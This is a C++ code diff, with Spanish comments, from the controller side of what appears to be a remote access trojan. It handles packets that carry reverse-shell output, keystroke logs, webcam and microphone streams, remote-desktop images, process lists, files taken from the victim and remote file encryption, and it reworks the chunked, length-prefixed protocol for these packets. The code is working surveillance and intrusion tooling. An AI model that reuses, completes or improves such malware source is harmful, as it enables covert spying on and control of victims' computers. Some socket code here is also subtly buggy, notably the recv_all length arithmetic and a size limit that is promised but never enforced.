@@ -15,6 +15,13 @@ std::mutex vector_mutex;
 std::mutex count_mutex;
 std::mutex list_mutex;
 
+void Print_Packet(const Paquete& paquete) {
+    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
+    std::cout << "[CHUNK]Tam buffer: " << paquete.uiTamBuffer << '\n';
+    std::cout << "Ultimo: " << paquete.uiIsUltimo << '\n';
+    //std::cout << "Buffer: " << paquete.cBuffer.data() << "\n";
+}
+
 bool Cliente_Handler::OpenPlayer() {
     WAVEFORMATEX wfx = {};
     wfx.wFormatTag = WAVE_FORMAT_PCM;
@@ -68,8 +75,7 @@ void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
 }
 
 void Cliente_Handler::Command_Handler(){
-    int iBufferSize = 1024 * 1024; //1 MB
-    std::vector<char> cBuffer(iBufferSize);
+    std::vector<char> cBuffer;
     DWORD error_code = 0;
     int iTempRecibido = 0;
     while (true) {
@@ -80,7 +86,7 @@ void Cliente_Handler::Command_Handler(){
         }
         
         
-        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer.data(), iBufferSize - 1, 0, true, &error_code);
+        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, 0, true, &error_code);
         this->SetBytesRecibidos(iTempRecibido);
         
         //timeout
@@ -96,55 +102,66 @@ void Cliente_Handler::Command_Handler(){
 
         /*Desconexion del cliente
         Si no recibio nada y el error no es timeout o se cerro repentinamente*/
-        if ((this->BytesRecibidos() == WSAECONNRESET) || (this->BytesRecibidos() == 0 && error_code == 0)) {
+        if ((iTempRecibido == WSAECONNRESET) || (iTempRecibido == 0 && error_code == 0)) {
             if (this->m_isFrameVisible()) {
                 this->n_Frame->SetTitle("DESCONECTADO...");
             }
             std::unique_lock<std::mutex> lock(this->mt_Running);
             this->iRecibido = WSA_FUNADO;
             break;
-        }else if (this->BytesRecibidos() <= 0) {
+        }else if (iTempRecibido <= 0) {
             continue;
         }
 
-        
         //Agregar datos al queue
-        cBuffer[iTempRecibido] = '\0';
-        std::unique_lock<std::mutex> lock(this->mt_Queue);
-        std::vector<char> nBuffer(iTempRecibido+1);
-        std::memcpy(nBuffer.data(), cBuffer.data(), iTempRecibido+1);
-        
-        this->queue_Comandos.push(nBuffer);
+        if (iTempRecibido > 0) {
+            struct Paquete nNuevo;
+            p_Servidor->m_DeserializarPaquete(cBuffer.data(), nNuevo);
+            this->Procesar_Paquete(nNuevo);
+        }
     }
 
+    this->Log("Done!");
     
+}
 
-    this->Log("Done");
+void Cliente_Handler::Add_to_Queue(const Paquete_Queue& paquete) {
+    std::unique_lock<std::mutex> lock(this->mt_Queue);
+    this->queue_Comandos.push(paquete);
+}
 
+void Cliente_Handler::Procesar_Paquete(const Paquete& paquete) {
+    std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
+    size_t oldSize = acumulador.size();
+    acumulador.resize(oldSize + paquete.uiTamBuffer);
+    memcpy(acumulador.data() + oldSize, paquete.cBuffer.data(), paquete.uiTamBuffer);
+
+    if(paquete.uiIsUltimo == 1){
+        acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
+        Paquete_Queue nNuevo;
+        nNuevo.uiTipoPaquete = paquete.uiTipoPaquete;
+        nNuevo.cBuffer.insert(nNuevo.cBuffer.begin(), acumulador.begin(), acumulador.end());
+
+        this->Add_to_Queue(nNuevo);
+
+        this->paquetes_Acumulados.erase(paquete.uiTipoPaquete);
+    }
 }
 
 void Cliente_Handler::Process_Queue() {
 
     while (true) {
-        int iTotal = 0;
+        
+        if (!this->isfRunning() || !this->m_isQueueRunning()) {break;}
+
         std::unique_lock<std::mutex> lock(this->mt_Queue);
-        iTotal = this->queue_Comandos.size();
-        lock.unlock();
 
-        if (!this->isfRunning() && iTotal == 0) {break;}
-
-        if (iTotal > 0) {
-            //Copiar el buffer para liberar el lock y seguir agregando tareas
-            lock.lock();
-            std::vector<char> nTemp = this->queue_Comandos.front();
-            this->queue_Comandos.pop(); //Elminar del queue
+        if (this->queue_Comandos.size() > 0) {
+            Paquete_Queue nTemp = this->queue_Comandos.front();
+            this->queue_Comandos.pop(); 
             lock.unlock();
 
-            this->Process_Command(nTemp); //Procesar comando
-        }else {
-            if (!this->m_isQueueRunning()) {
-                break;
-            }
+            this->Process_Command(nTemp);
         }
         std::this_thread::sleep_for(std::chrono::milliseconds(10));
     }
@@ -153,32 +170,26 @@ void Cliente_Handler::Process_Queue() {
     while (this->queue_Comandos.size() > 0) {
         this->queue_Comandos.pop();
     }
-    lock.unlock();
 }
 
-void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
-    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 1);
-    if (vcDatos.size() == 0) {
-        this->Log("No se pudo procesar el buffer");
-        return;
-    }
-    int iRecibido = cBuffer.size();
-    int iHeadSize = vcDatos[0].size() + 1;
-    int iComando = atoi(vcDatos[0].c_str());
+void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
+    std::vector<std::string> vcDatos;
+    int iRecibido = paquete.cBuffer.size();
+    int iComando = paquete.uiTipoPaquete;
 
     //Pquete inicial
     if (iComando == EnumComandos::INIT_PACKET) {
-        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 5);
+        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 4);
         if (vcDatos.size() < 4) {
-            this->Log("Error procesando los datos " + std::string(cBuffer.data()));
+            this->Log("Error procesando los datos " + std::string(paquete.cBuffer.data()));
             return;
         }
         struct Cliente structTmp;
 
-        structTmp._strSo = this->p_Cliente._strSo = vcDatos[1];
-        structTmp._strUser = this->p_Cliente._strUser = vcDatos[2];
-        structTmp._strPID = this->p_Cliente._strPID = vcDatos[3];
-        structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
+        structTmp._strSo = this->p_Cliente._strSo = vcDatos[0];
+        structTmp._strUser = this->p_Cliente._strUser = vcDatos[1];
+        structTmp._strPID = this->p_Cliente._strPID = vcDatos[2];
+        structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[3];
         structTmp._id = this->p_Cliente._id;
         structTmp._strIp = this->p_Cliente._strIp;
 
@@ -198,8 +209,7 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //Salida de shell
     if (iComando == EnumComandos::Reverse_Shell_Salida) {
         if (this->m_isFrameVisible()) {
-            char* pBuf = cBuffer.data() + iHeadSize;
-            this->EscribirSalidShell(std::string(pBuf));
+            this->EscribirSalidShell(std::string(paquete.cBuffer.data()));
         }
         return;
     }
@@ -208,11 +218,8 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     if (iComando == EnumComandos::FM_Dir_Folder) {
         if (this->m_isFrameVisible()) {
             ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
-            //Comprobar que al movel el puntero no se pase del buffer
-
-            char* cFilesBuffer = cBuffer.data() + iHeadSize;
-            if (temp_list && cFilesBuffer) {
-                temp_list->ListarDir(cFilesBuffer);
+            if (temp_list) {
+                temp_list->ListarDir(paquete.cBuffer.data());
             }
         }
         return;
@@ -221,8 +228,7 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //Listar dispositivos de almacenamiento
     if (iComando == EnumComandos::FM_Discos_Lista) {
         if (this->m_isFrameVisible()) {
-            char* pBuf = cBuffer.data() + iHeadSize;
-            std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);
+            std::vector<std::string> vDrives = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 100);
 
             if (vDrives.size() > 0) {
                 ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
@@ -237,40 +243,38 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
 
     //Paquete inicial para descargar archivo
     if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
-        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 3);
-        if (vcDatos.size() == 3) {
+        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
+        if (vcDatos.size() == 2) {
             //Tama�o del archivo recibido
-            u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
+            u64 uTamArchivo = StrToUint(vcDatos[1].c_str());
 
-            this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;
+            this->um_Archivos_Descarga[vcDatos[0]].uTamarchivo = uTamArchivo;
 
             std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-            p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
+            p_Servidor->vcTransferencias[vcDatos[0]].uTamano = uTamArchivo;
             lock.unlock();
 
-            std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+            std::cout << "[ID-" << vcDatos[0] << "]Tam archivo: " << uTamArchivo << std::endl;
         }
         return;
     }
 
     //Paquete de archivo
     if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
-        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
-        if (vcDatos.size() == 2) {
-            // CMD + 2 slashs /  +len del id
-            int iHeader = iHeadSize + vcDatos[1].size() + 1;
-            int iBytesSize = iRecibido - iHeader - 1;
-            char* cBytes = cBuffer.data() + iHeader;
+        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
+        if (vcDatos.size() == 1) {
+            int iHeader = vcDatos[0].size() + 1;
+            int iBytesSize = iRecibido - iHeader - 1; //1 byte del delimitador y otro del \0 agregado al procesar el paquete
+            const char* cBytes = paquete.cBuffer.data() + iHeader;
             std::cout << "[DOWN] " << iBytesSize << " TOTAL: "<<iRecibido<< '\n';
-            if (this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->is_open()) {
-                this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->write(cBytes, iBytesSize);
+            if (this->um_Archivos_Descarga[vcDatos[0]].ssOutFile.get()->is_open()) {
+                this->um_Archivos_Descarga[vcDatos[0]].ssOutFile.get()->write(cBytes, iBytesSize);
                 //Por los momentos solo es necesario que el servidor almacene el progreso
                 //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;
 
                 std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-                p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
-            }
-            else {
+                p_Servidor->vcTransferencias[vcDatos[0]].uDescargado += iBytesSize;
+            }else {
                 this->Log("El archivo no esta abierto");
             }
         }
@@ -279,19 +283,16 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
 
     //Se termino la descarga del archivo
     if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
-        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
-        if (vcDatos.size() == 2) {
-            if (this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->is_open()) {
-                this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->close();
-            }
-
-            this->Log("[!] Descarga completa");
+        std::string strID = paquete.cBuffer.data();
+        if (this->um_Archivos_Descarga[strID].ssOutFile->is_open()) {
+            this->um_Archivos_Descarga[strID].ssOutFile->close();
         }
+        this->Log("[!] Descarga completa");
         return;
     }
 
-    //Paque de editor de texto remoto
-    if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
+    //Paque de editor de texto remoto TEMPORALMENTE DESHABILITADO
+    /*if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
         if (this->m_isFrameVisible()) {
             vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
@@ -310,25 +311,21 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
             }
         }
         return;
-    }
+    }*/
 
     //Confirmacion de cifrado
     if (iComando == EnumComandos::FM_Crypt_Confirm) {
-        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
-        if (vcDatos.size() == 2) {
-            wxString strMessage = "";
-            if (vcDatos[1] == "1") {
-                strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
-            }
-            else if (vcDatos[1] == "2") {
-                strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
-            }
-            else if (vcDatos[1] == "3") {
-                strMessage = "[CYRPT] Operacion completada";
-            }
-
-            wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
+        std::string strRes = paquete.cBuffer.data();
+        wxString strMessage = "";
+        if (strRes == "1") {
+            strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
+        }else if (strRes == "2") {
+            strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
+        }else if (strRes == "3") {
+            strMessage = "[CYRPT] Operacion completada";
         }
+
+        wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
         return;
     }
 
@@ -337,16 +334,15 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
         if (this->m_isFrameVisible()) {
             panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
             if (temp_panel) {
-                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer.data() + 4));
+                temp_panel->p_RutaActual->SetLabelText(wxString(paquete.cBuffer.data()));
                 temp_panel->c_RutaActual.clear();
-                std::vector<std::string> vcSubRutas = strSplit(cBuffer.data() + 4, CMD_DEL, 100);
+                std::vector<std::string> vcSubRutas = strSplit(paquete.cBuffer.data(), CMD_DEL, 100);
                 for (auto item : vcSubRutas) {
                     std::string strTemp = item;
                     strTemp += "\\";
                     temp_panel->c_RutaActual.push_back(strTemp);
                 }
-            }
-            else {
+            }else {
                 this->Log("No se pudo encontrar panel FM activo");
             }
         }
@@ -356,10 +352,9 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //Lista de procesos remotos
     if (iComando == EnumComandos::PM_Lista) {
         if (this->m_isFrameVisible()) {
-            char* cData = cBuffer.data() + iHeadSize;
             panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
             if (panel_proc) {
-                panel_proc->listManager->AgregarData(std::string(cData), this->p_Cliente._strPID);
+                panel_proc->listManager->AgregarData(std::string(paquete.cBuffer.data()), this->p_Cliente._strPID);
             }
         }
         return;
@@ -370,10 +365,8 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
         if (this->m_isFrameVisible()) {
             panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
             if (temp_panel) {
-                char* cKeyData = cBuffer.data() + iHeadSize;
-                temp_panel->txt_Data->AppendText(cKeyData);
-            }
-            else {
+                temp_panel->txt_Data->AppendText(paquete.cBuffer.data());
+            }else {
                 this->Log("[X] No se pudo encontrar el panel keylogger");
             }
         }
@@ -383,19 +376,16 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //mod camara - Lista de dispositivos
     if (iComando == EnumComandos::CM_Lista_Salida) {
         if (this->m_isFrameVisible()) {
-            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
-                if (vcCams.size() > 0) {
-                    wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
-                    if (panel_cam_combo) {
-                        wxArrayString arrCams;
-                        for (std::string cCam : vcCams) {
-                            arrCams.push_back(cCam);
-                        }
-                        panel_cam_combo->Clear();
-                        panel_cam_combo->Append(arrCams);
+            std::vector<std::string> vcCams = strSplit(paquete.cBuffer.data(), '|', 10); //quien tiene mas de 10 camaras?
+            if (vcCams.size() > 0) {
+                wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
+                if (panel_cam_combo) {
+                    wxArrayString arrCams;
+                    for (std::string cCam : vcCams) {
+                        arrCams.push_back(cCam);
                     }
+                    panel_cam_combo->Clear();
+                    panel_cam_combo->Append(arrCams);
                 }
             }
         }
@@ -405,14 +395,12 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //mod camara - Buffer de video de la camara
     if (iComando == EnumComandos::CM_Single_Salida) {
         if (this->m_isFrameVisible()) {
-            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                //CMD DEL ID_DEV DEL BUFFER
-                this->Log(cBuffer.data());
-                int iHeadSize2 = vcDatos[0].size() + vcDatos[1].size() + 2; //CMD + len de dos delimitador + len del id del dev
-                int iBuffSize = iRecibido - iHeadSize2;
-                char* cBytes = cBuffer.data() + iHeadSize2;
-                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
+            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
+            if (vcDatos.size() == 1) {
+                int iHeadSize = vcDatos[0].size() + 1; //len del id del dev
+                int iBuffSize = iRecibido - iHeadSize - 1;
+                const char* cBytes = paquete.cBuffer.data() + iHeadSize;
+                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0], this->n_Frame);
                 if (panel_picture) {
                     panel_picture->OnDrawBuffer(cBytes, iBuffSize);
                 }
@@ -427,10 +415,10 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //mod microfono - Lista de dispositivos
     if (iComando == EnumComandos::Mic_Refre_Resultado) {
         if (this->m_isFrameVisible()) {
-            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 15); //15 maximo :v
+            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 15); //15 maximo :v
             if (vcDatos.size() > 0) {
                 wxArrayString cli_devices;
-                for (int i = 1; i<int(vcDatos.size()); i++) {
+                for (int i = 0; i<int(vcDatos.size()); i++) {
                     cli_devices.push_back(vcDatos[i]);
                 }
 
@@ -441,8 +429,7 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
                         temp_combo_box->Clear();
                         temp_combo_box->Append(cli_devices);
                     }
-                }
-                else {
+                }else {
                     std::cout << "No se pudo encontrar ventana activa\n";
                 }
             }
@@ -454,9 +441,8 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     if (iComando == EnumComandos::Mic_Live_Packet) {
         if (this->m_isFrameVisible()) {
             if (this->OpenPlayer()) {
-                int iRawSize = this->BytesRecibidos() - iHeadSize;
-                char* cBuff = cBuffer.data() + iHeadSize;
-                this->PlayBuffer(cBuff, iRawSize);
+                char* cbuff = (char*)paquete.cBuffer.data();
+                this->PlayBuffer(cbuff, iRecibido - 1);
                 this->ClosePlayer();
             }
             else {
@@ -469,11 +455,9 @@ void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
     //mod escritorio remoto - Buffer de video del escritorio
     if (iComando == EnumComandos::RD_Salida) {
         if (this->m_isFrameVisible()) {
-            char* cPicBuffer = cBuffer.data() + iHeadSize;
-            int iBufferSize = iRecibido - iHeadSize;
             frameRemoteDesktop* temp_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
             if (temp_frame) {
-                temp_frame->OnDrawBuffer(cPicBuffer, iBufferSize);
+                temp_frame->OnDrawBuffer(paquete.cBuffer.data(), iRecibido-1);
             }
         }
         return;
@@ -843,69 +827,88 @@ void Servidor::m_RemoverClienteLista(std::string p_ID){
     
 }
 
-int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
+int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
+    //Aqui hacer loop para enviar por partes el buffer
+    int iEnviado      =    0;
+    int iRestante     =    0;
+    int iBytePos      =    0;
+    int iChunkSize    =    0;
+    int iChunkEnviado =    0;
+    int iDataSize     = pLen;
+
+    struct Paquete nPaquete;
+    int iPaquet_Size = (sizeof(int) * 3) + PAQUETE_BUFFER_SIZE;
+    char cPaqueteSer[(sizeof(int) * 3) + PAQUETE_BUFFER_SIZE];
+
+    while (true) {
+        iRestante = (iDataSize > iPaquet_Size) ? iDataSize - iPaquet_Size : iDataSize;
+
+        //Si aun hay bytes por enviar
+        if (iRestante > 0) {
+            //Determinar el tamano el pedazo a enviar
+            if (iRestante >= PAQUETE_BUFFER_SIZE) {
+                iChunkSize = PAQUETE_BUFFER_SIZE;
+            }
+            else {
+                //Leer el ultimo pedazo
+                iChunkSize = iRestante;
+            }
+            iDataSize -= iChunkSize;
+
+            //Armar paquete a serializar
+            nPaquete.uiTipoPaquete =           iTipoPaquete;
+            nPaquete.uiTamBuffer   =             iChunkSize;
+            nPaquete.uiIsUltimo    = iDataSize == 0 ? 1 : 0;
+            nPaquete.cBuffer.resize( iChunkSize );
+            if (nPaquete.cBuffer.size() < iChunkSize) {
+                std::cout << "[CHUNK] No se pudo reservar memoria\n";
+                break;
+            }
+
+            int iFinalSize = (sizeof(int) * 3) + iChunkSize;
+            
+            memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);
+
+            Print_Packet(nPaquete);
+
+            this->m_SerializarPaquete(nPaquete, cPaqueteSer);
+
+            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, isBlock, 0);
+            
+            iEnviado += iChunkEnviado;
+            iBytePos +=    iChunkSize;
+        }else {
+            break;
+        }
+
+    }
+
+    return iEnviado;
+}
+
+int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
     // 1 non block
     // 0 block
 
-    //Tamaño del buffer + cabecera
-    unsigned long iDataSize = pLen + 2;
+    std::unique_lock<std::mutex> lock(this->p_sckmutex);
 
-    std::unique_ptr<char[]> new_Buffer = std::make_unique<char[]>(iDataSize);
-    if (!new_Buffer) {
-        std::cout << "No se pudo reservar la memoria\n";
-        return -1;
-    }
-
-    //por defecto la cabecera se seteara como descomprimido
-    // esto solo cambia si no hay ningun error durante el proceso de compresion
-    new_Buffer[0] = UNCOMP_HEADER_BYTE_1;
-    new_Buffer[1] = COMP_HEADER_BYTE_2;
-    
-    //Primero comprimir si el paquete es mayor a 1024 bytes
-    if (pLen > BUFFER_COMP_REQ_LEN) {
-        //Comprimir  buffer
-        std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize * 3]);
-        if (compData) {
-            unsigned long out_len = iDataSize;
-            int iRet = compress2(compData.get(), &out_len, reinterpret_cast<const unsigned char*>(pBuffer), pLen, Z_BEST_COMPRESSION);
-            if (iRet == Z_OK) {
-                //Success
-                if (out_len < iDataSize) {
-                    new_Buffer[0] = COMP_HEADER_BYTE_1;
-                    std::memcpy(new_Buffer.get() + 2, compData.get(), out_len);
-                    iDataSize = out_len + 2; //Cantidad de bytes que fueron comprimidos + cabecera (2 bytes)
-                }else {
-                    //El buffer compreso es mayor al original, copiar el mismo buffer
-                    std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-                }
-            }else if (iRet == Z_MEM_ERROR) {
-                std::cout << "No hay memoria suficiente\n";
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }else if (iRet == Z_BUF_ERROR) {
-                std::cout << "El output no tiene memoria suficiente\n";
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }else {
-                std::cout << "A jaber que pajo\n";
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }
-        }else {
-            std::cout << "No se pudo reservar memoria para el buffer de compression\n";
-            //Copiar buffer original
-            std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-        }
-
-    }else {
-        //No comprimir ya que el buffer no es tan grande
-        std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-    }
+    //Tamaño del buffer
+    int iDataSize = pLen;
 
     //Vector que aloja el buffer cifrado
-    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(new_Buffer.get()), iDataSize);
+    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
     if (iDataSize == 0) {
         error();
         return -1;
     }
+
+    //Enviar al inicio el size del paquete
+    std::vector<char> cBufferFinal(iDataSize + sizeof(int));
+    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
+    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
+    
+    iDataSize += sizeof(int);
 
     int iEnviado = 0;
     unsigned long int iBlock = 0;
@@ -917,8 +920,8 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
         }
     }
 
-    iEnviado = send(pSocket, reinterpret_cast<const char*>(cData.data()), iDataSize, pFlags);
-        
+    iEnviado = send(pSocket, cBufferFinal.data(), iDataSize, pFlags);
+
     //Restaurar
     if (isBlock) {
         iBlock = 1;
@@ -930,21 +933,33 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     return iEnviado;
 }
 
-int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, unsigned long pLen, int pFlags, bool isBlock, DWORD* error_code) {
+int Servidor::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
+    int iRecibido = 0;
+    int iTotalRecibido = 0;
+    while (iTotalRecibido < pLen) {
+        iRecibido = recv(pSocket, pBuffer + iTotalRecibido, pLen - iRecibido, pFlags);
+        if (iRecibido == 0) {
+            //Se cerro el socket
+            break;
+        }else if (iRecibido < 0) {
+            //Ocurrio un error
+            return -1;
+        }
+
+        iTotalRecibido += iRecibido;
+    }
+
+    return iTotalRecibido;
+}
+
+int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* error_code) {
     
     // 1 non block
     // 0 block
     
-    if (!pBuffer) {
-        std::cout << "Buffer no reservado para recibir paquete\n";
-        return 0;
-    }
-
-    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
-    
     int iRecibido = 0;
     unsigned long int iBlock = 0;
-    
+    std::vector<char> cRecvBuffer;
     //Hacer el socket block
     if (isBlock) {
         //Hacer el socket block
@@ -953,11 +968,20 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, unsigned long pLen, int pFla
         }
     }
 
-    //Recibir el buffer
-    iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
+    //Leer primero sizeof(int) para obtener el total de bytes a leer
+    char cBuffSize[sizeof(int)];
+    int iPaqueteSize = recv(pSocket, cBuffSize, sizeof(int), pFlags);
+    if (iPaqueteSize == sizeof(int)) {
+        memcpy(&iPaqueteSize, cBuffSize, sizeof(int));
+        //Establecer un limite para evitar buffer demasiado grande 
+        cRecvBuffer.resize(iPaqueteSize);
+        iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaqueteSize, pFlags);
+    }
+
     if (error_code != nullptr) {
         *error_code = WSAGetLastError();
     }
+
 
     if (WSAGetLastError() == WSAECONNRESET || iRecibido < 0) {
         return WSAECONNRESET;
@@ -974,51 +998,41 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, unsigned long pLen, int pFla
     }
         
     //Decrypt
-    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
-    //Quitar 2 bytes por la cabecera
-    iRecibido = bOut.size() - 2;
+    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
+    iRecibido = bOut.size();
     if (iRecibido == 0) {
         error();
         return -1;
     }
-        
-    //Comprobar si tiene la cabecera
-    if (iRecibido > 2) { //?
-        if (bOut[0] == COMP_HEADER_BYTE_1 && bOut[1] == COMP_HEADER_BYTE_2) {
-            std::shared_ptr<unsigned char[]> uncompBuffer(new unsigned char[pLen]);
-            if (uncompBuffer) {
-                unsigned long out_len = pLen;
-                int iRet = uncompress(uncompBuffer.get(), &out_len, bOut.data() + 2, iRecibido);
-                if (iRet == Z_OK) {
-                    //Si el buffer final es menor al tamaño del buffer final proceder
-                    if (out_len < pLen) {
-                        std::memcpy(pBuffer, uncompBuffer.get(), out_len);
-                        iRecibido = out_len;
-                    }else {
-                        std::cout << "El buffer descomprimido es mayor al buffer reservado (parametro)\n";
-                        iRecibido = 0;
-                    }
-                }else if (iRet == Z_MEM_ERROR) {
-                    std::cout << "No hay memoria suficiente\n";
-                    iRecibido = 0;
-                }else if (iRet == Z_BUF_ERROR) {
-                    std::cout << "El output no tiene memoria suficiente\n";
-                    iRecibido = 0;
-                }else {
-                    std::cout << "A jaber que pajo\n";
-                    iRecibido = 0;
-                }
-            }else {
-                std::cout << "No se pudo reservar memoria para descomprimir el paquete\n";
-                iRecibido = 0;
-            }
-        }else {
-            //No tiene la cabecera de compreso, copiar buffer desencriptado
-            std::memcpy(pBuffer, bOut.data()+2, iRecibido);
-        }
-    }
 
+    pBuffer.resize(iRecibido);
+    if (pBuffer.size() == iRecibido) {
+        memcpy(pBuffer.data(), bOut.data(), iRecibido);
+    }else {
+        std::cout << "[cRecv] No se pudo reservar memoria en el buffer de salida\n";
+        return -1;
+    }
     return iRecibido;
+}
+
+void Servidor::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
+    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
